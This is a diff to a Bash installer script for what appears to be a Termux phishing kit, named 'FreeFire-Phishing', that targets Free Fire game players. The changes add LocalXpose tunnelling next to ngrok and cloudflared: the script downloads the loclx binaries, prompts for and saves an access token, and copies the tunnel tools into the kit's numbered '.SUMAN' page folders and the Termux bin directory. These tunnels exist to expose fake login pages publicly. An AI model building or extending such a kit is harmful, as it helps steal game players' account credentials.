@@ -65,7 +65,7 @@ download() {
 		chmod +x $output $file > /dev/null 2>&1
 		rm -rf file1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\e[91m Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -73,9 +73,9 @@ download() {
 
 install_ngrok() {
 	if [[ -e "ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing ngrok..."
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -92,9 +92,9 @@ install_ngrok() {
 
 install_cloudflared() {
 	if [[ -e "cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Cloudflared..."
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -108,7 +108,24 @@ install_cloudflared() {
 	fi
 }
 
-
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e "loclx" ]]; then
+		echo -e "\e[91m[\e[92m-\e[91m] \e[96m LocalXpose already installed."
+	else
+		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing LocalXpose..."
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
 
 
 ngroktoken() {
@@ -126,7 +143,7 @@ echo -e "\e[93m
 \e[0m\n"
 echo ""
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mAuth Token ? \e[1;91m (y/n) : \e[0m' option
 echo""
 echo""
 echo""
@@ -149,6 +166,67 @@ fi
 if [[ $option == *'n'* ]]; then
 clear
 fi
+}
+
+localtoken() {
+echo ""
+echo -e "\e[93m 
+
+██       ██████   ██████  █████  ██      
+██      ██    ██ ██      ██   ██ ██      
+██      ██    ██ ██      ███████ ██      
+██      ██    ██ ██      ██   ██ ██      
+███████  ██████   ██████ ██   ██ ███████                                          
+ \e[92m                                        
+██   ██ ██████   ██████  ███████ ███████ 
+ ██ ██  ██   ██ ██    ██ ██      ██      
+  ███   ██████  ██    ██ ███████ █████   
+ ██ ██  ██      ██    ██      ██ ██      
+██   ██ ██       ██████  ███████ ███████ 
+                                                                   
+\e[0m\n"
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mLocalXpose \e[32mAccess Token ? \e[1;91m (y/n) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+clear
+localxpose_auth
+echo ""
+fi
+if [[ $option == *'n'* ]]; then
+clear
+fi
+}
+
+localxpose_auth() {
+	./loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./loclx account status | grep Error)" ] && {
+	        echo ""
+                echo " "
+		echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+                echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!      Requirement Localxpose Token    !!\e[0m'
+                echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+                echo ""
+                echo " "
+                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Visit \e[92mlocalxpose.io \e[m "
+                echo ""
+                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Create an account on & Click Access Button & Copy Access Token \e[m "
+                echo ""
+		sleep 3
+		read -p $'\e[91m[\e[92m*\e[91m]\e[93m Input Loclx Token :\e[97m ' loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\e[91m[\e[92m!\e[91m]\e[93m  You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
 }
 
 uninstall() {
@@ -278,6 +356,9 @@ rm -rf ngrok-v3*.tgz
 echo ""
 install_cloudflared
 mv cloudflared-li* cloudflared
+install_localxpose
+rm -rf  loclx-linux*
+chmod +x loclx loclx*
 chmod +x cloudflared ngrok
 sleep 1
 echo""
@@ -302,18 +383,20 @@ chmod +x FreeFire
 clear
 
 ngroktoken
+clear
+localtoken
 
 echo
-cp -R cloudflared ngrok .SUMAN/1/
-cp -R cloudflared ngrok .SUMAN/2/
-cp -R cloudflared ngrok .SUMAN/3/
-cp -R cloudflared ngrok .SUMAN/4/
-cp -R cloudflared ngrok .SUMAN/5/
-cp -R cloudflared ngrok .SUMAN/6/
-cp -R cloudflared ngrok .SUMAN/7/
-cp -R cloudflared ngrok .SUMAN/8/
-cp -R cloudflared ngrok .SUMAN/9/
-cp -R cloudflared ngrok .SUMAN/0/
+cp -R cloudflared ngrok loclx .SUMAN/1/
+cp -R cloudflared ngrok loclx .SUMAN/2/
+cp -R cloudflared ngrok loclx .SUMAN/3/
+cp -R cloudflared ngrok loclx .SUMAN/4/
+cp -R cloudflared ngrok loclx .SUMAN/5/
+cp -R cloudflared ngrok loclx .SUMAN/6/
+cp -R cloudflared ngrok loclx .SUMAN/7/
+cp -R cloudflared ngrok loclx .SUMAN/8/
+cp -R cloudflared ngrok loclx .SUMAN/9/
+cp -R cloudflared ngrok loclx .SUMAN/0/
 chmod 7777 FreeFire-Phishing
 clear
 echo
@@ -321,6 +404,7 @@ uninstall
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
 cp -R cloudflared /data/data/com.termux/files/usr/bin
+cp -R loclx /data/data/com.termux/files/usr/bin
 cp -R .SUMAN /data/data/com.termux/files/usr/bin
 cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
